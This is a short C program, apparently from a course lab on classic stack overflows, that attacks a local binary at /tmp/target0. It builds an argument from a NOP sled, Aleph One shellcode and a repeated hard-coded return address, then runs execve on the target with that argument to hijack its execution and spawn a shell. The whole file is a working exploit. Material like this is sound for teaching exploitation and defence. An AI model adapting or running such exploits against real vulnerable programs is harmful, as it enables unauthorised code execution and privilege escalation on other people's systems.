#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "";

  char str[408];
  memset(str, 0, 408);
  strcpy(str, "\x90\x90\x90");
  for (int i = 0; i < 200; ++i)
  {
  	strcat(str, "\x90");
  }
  strcat(str, shellcodeAlephOne);
  for (int i = 0; i < 38; ++i)
  {
  	strcat(str, "\x2c\xfb\xff\xbf");
  }
  args[1] = str;
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

